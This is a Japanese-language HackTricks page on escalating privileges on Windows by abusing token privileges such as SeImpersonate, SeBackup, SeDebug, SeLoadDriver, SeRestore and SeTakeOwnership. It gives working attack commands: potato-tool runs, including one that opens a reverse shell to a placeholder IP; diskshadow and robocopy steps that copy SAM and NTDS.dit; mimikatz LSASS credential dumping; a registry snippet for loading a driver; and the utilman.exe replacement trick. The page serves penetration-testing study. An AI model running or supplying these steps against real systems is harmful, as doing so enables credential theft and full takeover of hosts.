# Tokensの悪用

{{#include ../../banners/hacktricks-training.md}}

## Tokens

**Windows Access Tokensについて知らない場合は、続行する前にこのページを読んでください。**


{{#ref}}
access-tokens.md
{{#endref}}

**すでに保持しているTokensを悪用することで、privilegesをescalateできる場合があります。**

### SeImpersonatePrivilege

このprivilegeにより、プロセスはtokenへのhandleを取得できる場合に、そのtokenをimpersonateできます（ただし、作成はできません）。Windows service（DCOM）にexploitに対するNTLM authenticationを実行させることで、privileged tokenを取得し、その後SYSTEM privilegesでプロセスを実行できるようになります。<sup>[[2]](#references)</sup> このprimitiveは、[JuicyPotato](https://github.com/ohpe/juicy-potato)、[RogueWinRM](https://github.com/antonioCoco/RogueWinRM)（WinRMがdisabledである必要があります）、[SweetPotato](https://github.com/CCob/SweetPotato）、および[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)などのtoolsを使用してexploitできます。

Modern operator notes:

- **JuicyPotato is legacy**：Windows 10 1809+/Server 2019以降では、どのRPC/COM surfaceにまだ到達できるかに応じて、**GodPotato**、**SigmaPotato**、**PrintNotifyPotato**、**RoguePotato**、**SharpEfsPotato/EfsPotato**、または**PrintSpoofer**を優先してください。
- **`LOCAL SERVICE`**または**`NETWORK SERVICE`**として実行されているserviceをcompromiseし、`whoami /priv`に`SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`のない**filtered token**が表示される場合は、まずそのaccountの**default privilege set**を復元し（例：**FullPowers**を使用）、その後potato familyを再試行してください。<sup>[[3]](#references)</sup>
- 新しいforkの一部は、original toolsよりoperatorにとって使いやすくなっています。たとえば、**SigmaPotato**はreflection/in-memory executionとmodern Windows compatibilityを追加し、**PrintNotifyPotato**はPrintNotify COM serviceを悪用するため、classic Spooler pathがdisabledの場合に有用なことがよくあります。
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

これは **SeImpersonatePrivilege** と非常によく似ており、**同じ method** を使用して特権 token を取得します。\
この privilege により、**primary token を新しいプロセスまたは suspended 状態のプロセスに割り当てる**ことができます。特権を持つ impersonation token を使用して、primary token を派生させることができます（DuplicateTokenEx）。\
この token を使用すると、'CreateProcessAsUser' で **新しいプロセス**を作成するか、プロセスを suspended 状態で作成して **token を設定**できます（通常、実行中のプロセスの primary token は変更できません）。<sup>[[2]](#references)</sup>

### SeTcbPrivilege

この token が有効になっている場合、**KERB_S4U_LOGON** を使用して、credentials を知らなくても他の任意のユーザーの **impersonation token** を取得し、token に **任意の group**（admins）を追加し、token の **integrity level** を "**medium**" に設定して、この token を **current thread** に割り当てる（SetThreadToken）ことができます。<sup>[[2]](#references)</sup>

### SeBackupPrivilege

この privilege により、system は任意の file に対するすべての read access control（read operation に限定）を **grant** します。これは registry から **local Administrator** account の password hash を **reading** するために使用され、その後、"**psexec**" や "**wmiexec**" などの tools を hash とともに使用できます（Pass-the-Hash technique）。ただし、この technique は、Local Administrator account が disabled になっている場合、または remotely 接続する Local Administrators から administrative rights を削除する policy が設定されている場合の2つの条件では失敗します。<sup>[[2]](#references)</sup>\
実際には、最も reliable な built-in workflow は通常 **VSS + `robocopy /b`** です。shadow copy を作成・公開し、その後 **backup mode** で `SAM`/`SYSTEM` または `NTDS.dit` を copy します。これにより file ACLs を bypass できます。<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
この**権限を悪用**するには、次の方法があります。

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec) の **IppSec** に従う
- または、以下の **Backup Operators による権限昇格** セクションで説明されている方法:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

この権限により、ファイルの Access Control List (ACL) に関係なく、あらゆるシステムファイルへの**書き込みアクセス**が可能になります。これにより、**サービスの変更**、DLL Hijacking の実行、Image File Execution Options を介した **debugger** の設定など、権限昇格のためのさまざまな可能性が開かれます。<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege は強力な権限であり、特にユーザーが token を impersonate できる場合に有用ですが、SeImpersonatePrivilege がない場合にも役立ちます。この機能は、同じユーザーを表し、整合性レベルが現在のプロセスを超えない token を impersonate できることに依存します。<sup>[[2]](#references)</sup>

**主なポイント:**

- **SeImpersonatePrivilege なしでの impersonation:** 特定の条件下では、SeCreateTokenPrivilege を利用して token を impersonate することで EoP が可能です。
- **Token impersonation の条件:** impersonation を成功させるには、対象 token が同じユーザーに属し、整合性レベルが impersonation を試行するプロセスの整合性レベル以下である必要があります。
- **Impersonation token の作成と変更:** ユーザーは impersonation token を作成し、特権グループの SID (Security Identifier) を追加して強化できます。

### SeLoadDriverPrivilege

この権限により、特定の `ImagePath` と `Type` の値を持つレジストリエントリを作成して、プロセスが**デバイスドライバーをロードおよびアンロード**できるようになります。`HKLM` (HKEY_LOCAL_MACHINE) への直接の書き込みアクセスは制限されているため、代わりに `HKCU` (HKEY_CURRENT_USER) を使用できます。ただし、`HKCU` のエントリをカーネルがドライバー構成として認識できるようにするには、特定のパスが必要です。<sup>[[2]](#references)</sup>

現在の offensive use では、通常 **BYOVD** (bring your own vulnerable driver) が使用されます。つまり、**署名済みだが脆弱な** kernel driver をロードし、その IOCTL を使用して保護を無効化するか、kernel code execution に移行します。最近の Windows 11/Server ビルドでは、**Microsoft vulnerable driver blocklist** および/または **HVCI/Memory Integrity** によって古い public chain が機能しなくなることが多いため、従来の `szkg64.sys` 形式の例は、もはや一律に信頼できるものではありません。

このパスは `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` です。ここで `<RID>` は現在のユーザーの Relative Identifier です。`HKCU` 内にこのパス全体を作成し、2 つの値を設定する必要があります。<sup>[[2]](#references)</sup>

- `ImagePath`: 実行するバイナリへのパス
- `Type`: `SERVICE_KERNEL_DRIVER` (`0x00000001`) の値。

**実行手順:**

1. 書き込みアクセスが制限されているため、`HKLM` の代わりに `HKCU` にアクセスします。
2. `HKCU` 内に、現在のユーザーの Relative Identifier を表す `<RID>` を使用して、パス `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` を作成します。
3. `ImagePath` にバイナリの実行パスを設定します。
4. `Type` に `SERVICE_KERNEL_DRIVER` (`0x00000001`) を割り当てます。
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
この privilege を abuse するその他の方法については、[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege) を参照してください。

### SeTakeOwnershipPrivilege

これは **SeRestorePrivilege** と似ています。主な機能は、WRITE_OWNER access rights を提供することで明示的な discretionary access の要件を回避し、プロセスが **object の ownership を引き受ける** ことを可能にします。このプロセスでは、まず書き込み対象の registry key の ownership を確保し、その後 DACL を変更して write operations を有効にします。<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

この権限により、**他のプロセスをデバッグ**できます。これにはメモリの読み取りと書き込みも含まれます。この権限を使うことで、ほとんどの antivirus や host intrusion prevention solution を回避できる、さまざまなメモリインジェクションの手法を利用できます。<sup>[[2]](#references)</sup>

最新の Windows では、`SeDebugPrivilege` があれば通常、**保護されていない SYSTEM プロセス**を開いてトークンを複製するには十分ですが、**LSASS** にアクセスできることが保証されるわけではない点に注意してください。**RunAsPPL / LSA Protection** が有効な場合、`SeDebugPrivilege` が存在していても、保護されていないプロセスは LSASS の読み取りやインジェクションを実行できません。その場合は、別の non-PPL SYSTEM プロセスからトークンを盗むか、`procdump` が動作すると想定せずに PPL bypass/BYOVD と chain してください。`SeDebugPrivilege` + `SeImpersonatePrivilege` を使用した完全なトークンコピーの例については、[このページ](sedebug-+-seimpersonate-copy-token.md)を確認してください。

#### メモリをダンプする

[SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) の [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) を使用して、**プロセスのメモリを取得**できます。具体的には、ユーザーがシステムへのログインに成功した後、ユーザーの認証情報を保存する **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** プロセスに対して使用できます。

その後、このダンプを mimikatz に読み込ませてパスワードを取得できます：
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

`NT SYSTEM` shellを取得したい場合は、以下を使用できます：

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

この権限（ボリュームの保守タスクを実行する）は、NTFS ACL をバイパスして直接ディスク I/O を行うための、raw ボリュームデバイスハンドル（例：\\.\C:）を開くことを可能にします。これにより、基盤となるブロックを読み取ってボリューム上の任意のファイルのバイト列をコピーできるため、機密情報（例：%ProgramData%\Microsoft\Crypto\ 内のマシン秘密鍵、レジストリハイブ、VSS 経由の SAM/NTDS）を任意に読み取れます。<sup>[[5]](#references)</sup> CA サーバーでは特に影響が大きく、CA 秘密鍵を窃取すると Golden Certificate を偽造し、任意のプリンシパルになりすますことが可能になります。<sup>[[6]](#references)</sup>

詳細な手法と緩和策については、以下を参照してください。

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## 権限の確認
```
whoami /priv
```
**Disabled** として表示される **tokens** は通常有効化できるため、_Enabled_ と _Disabled_ の両方の privileges を abuse できることがよくあります。

### すべての tokens を有効化する

Disabled privileges がある場合は、[**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) スクリプトを使用して、すべての tokens を有効化できます。
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
または、この[**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)に埋め込まれた**script**。

## 表

完全な token privileges の cheatsheet は [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin) にあります。以下の概要では、admin session を取得したり機密ファイルを読み取ったりするために privilege を直接 exploit する方法のみを記載します。<sup>[[1]](#references)</sup>

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"ユーザーが token を impersonate し、potato.exe、rottenpotato.exe、juicypotato.exe などの tools を使用して nt system へ privesc できるようになります"_                                                                                                                                                                                                      | 更新してくれた [Aurélien Chalot](https://twitter.com/Defte_) に感謝します。近いうちに、より recipe らしい表現に書き直す予定です。                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | `robocopy /b` または専用の SeBackup 対応 copy helpers を使用して機密ファイルを読み取る。                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`、`SECURITY`、`NTDS.dit`、および場合によっては `%WINDIR%\MEMORY.DMP` に有効です。<br><br>- `robocopy` は便利ですが、ロック中または開かれているファイルには専用の SeBackup cmdlets/APIs のほうが柔軟な場合があります。</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken` を使用して、local admin rights を含む任意の token を作成する。                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | **non-PPL** SYSTEM token を duplicate するか、protected ではない process から memory を dump する。                                                                                                                                                                                                                                                                 | <p>RunAsPPL/LSA Protection が有効な場合、LSASS dumping は一般的に block されます。</p><p>Script は [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) にあります。</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | **Potato family** / named-pipe impersonation を使用して SYSTEM を spawn する（`PrintSpoofer`、`RoguePotato`、`GodPotato`、`SigmaPotato`、`PrintNotifyPotato` など）。                                                                                                                                                                                    | <p>IIS APPPOOL、MSSQL、scheduled tasks などの service accounts、またはすでに `SeImpersonatePrivilege` を所有しているあらゆる context で最も実用的です。</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. signed-but-vulnerable kernel driver（BYOVD）を load する<br>2. driver の IOCTLs を使用して kernel R/W を取得し、security tooling を disable するか、SYSTEM に elevate する<br><br>または、この privilege を使用して、<code>fltMC</code> builtin command で security 関連の drivers を unload することもできます。例: <code>fltMC sysmondrv</code></p>                     | <p><code>szkg64.sys</code> などの古い public drivers は、vulnerable-driver blocklist / HVCI により、modern Windows では block されるケースが増えています。</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege が存在する状態で PowerShell/ISE を launch する。<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a> で privilege を enable する。<br>3. utilman.exe を utilman.old に rename する<br>4. cmd.exe を utilman.exe に rename する<br>5. console を lock して Win+U を押す</p> | <p>この attack は一部の AV software に detect される可能性があります。</p><p>Alternative method では、同じ privilege を使用して "Program Files" に保存された service binaries を replace します。</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe を utilman.exe に rename する<br>4. console を lock して Win+U を押す</p>                                                                                                                                       | <p>この attack は一部の AV software に detect される可能性があります。</p><p>Alternative method では、同じ privilege を使用して "Program Files" に保存された service binaries を replace します。</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>tokens を manipulate して local admin rights を含める。SeImpersonate が必要になる場合があります。</p><p>要検証。</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - Windows privileges から admin への exploitation paths](https://github.com/gtworek/Priv2Admin)
- [2] [LPE のための Token Privileges の Abuse](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Privileges を返してくれ！頼むから？](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy（`/b` backup mode による file/folder ACL checks の bypass）](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – volume maintenance tasks の実行（SeManageVolumePrivilege）](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate（SeManageVolumePrivilege → CA key exfil → Golden Certificate）](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
